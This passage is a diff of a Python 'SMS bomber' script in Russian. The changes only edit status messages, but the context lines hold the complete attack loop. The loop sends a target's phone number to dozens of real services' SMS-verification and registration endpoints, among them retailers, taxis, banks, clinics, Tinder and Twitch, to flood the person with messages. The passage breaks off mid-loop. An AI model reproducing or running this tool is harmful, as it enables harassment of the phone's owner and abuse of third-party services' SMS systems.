+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -12027,10 +12027,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -12038,10 +12038,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -12049,10 +12049,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -12061,10 +12061,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -12072,10 +12072,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -12083,10 +12083,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -12095,10 +12095,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua',
@@ -12109,10 +12109,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -12120,10 +12120,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -12131,10 +12131,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -12143,10 +12143,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -12157,10 +12157,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -12168,10 +12168,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -12179,10 +12179,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -12191,10 +12191,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -12202,10 +12202,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -12214,10 +12214,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -12225,10 +12225,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -12238,10 +12238,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -12254,10 +12254,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -12266,10 +12266,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -12278,10 +12278,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -12291,10 +12291,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -12302,10 +12302,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -12314,10 +12314,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -12325,10 +12325,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -12337,10 +12337,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -12350,10 +12350,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -12362,10 +12362,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -12376,7 +12376,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -12384,10 +12384,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -12396,10 +12396,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -12408,10 +12408,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -12421,10 +12421,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -12434,10 +12434,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -12445,10 +12445,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -12458,10 +12458,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -12469,10 +12469,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -12482,10 +12482,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -12498,10 +12498,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -12509,10 +12509,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -12520,10 +12520,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -12531,10 +12531,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -12542,10 +12542,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -12554,10 +12554,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -12566,10 +12566,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -12578,10 +12578,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -12591,10 +12591,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -12604,10 +12604,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -12616,10 +12616,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -12627,10 +12627,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -12638,10 +12638,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -12649,10 +12649,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -12661,10 +12661,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -12674,10 +12674,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -12686,10 +12686,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -12697,10 +12697,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -12710,10 +12710,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -12721,10 +12721,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -12732,10 +12732,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -12746,10 +12746,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
